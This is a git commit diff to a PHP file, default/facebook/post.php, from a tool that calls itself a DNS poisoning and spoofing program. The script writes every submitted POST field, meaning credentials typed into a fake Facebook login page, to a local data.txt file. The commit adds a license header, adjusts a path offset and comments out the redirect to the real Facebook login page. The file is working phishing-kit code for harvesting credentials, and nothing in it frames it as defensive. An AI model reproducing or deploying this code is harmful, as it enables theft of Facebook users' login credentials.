a6402abddfa5c4e89643a81f69f1af8d901bd2bf
mak <makindosx@gmail.com>
2019-11-10 18:36:30 +0200

    Add files via upload

--- default/facebook/post.php
+++ default/facebook/post.php
@@ -1,12 +1,32 @@
 <?php 
 
+/*
+*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
+*  proxior is a program for poisoning and spoofing dns.
+*
+*  proxior is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  proxior is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
+
+
 $path = getcwd();
 
-$path = substr($path,0,17);
+$path = substr($path,0,16);
 
 $file = $path ."/export/data.txt";
 
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 ?>
 
-<meta http-equiv="refresh" content="0; url=https://el-gr.facebook.com/login/"/>
+<!-- <meta http-equiv="refresh" content="0; url=https://el-gr.facebook.com"/> -->
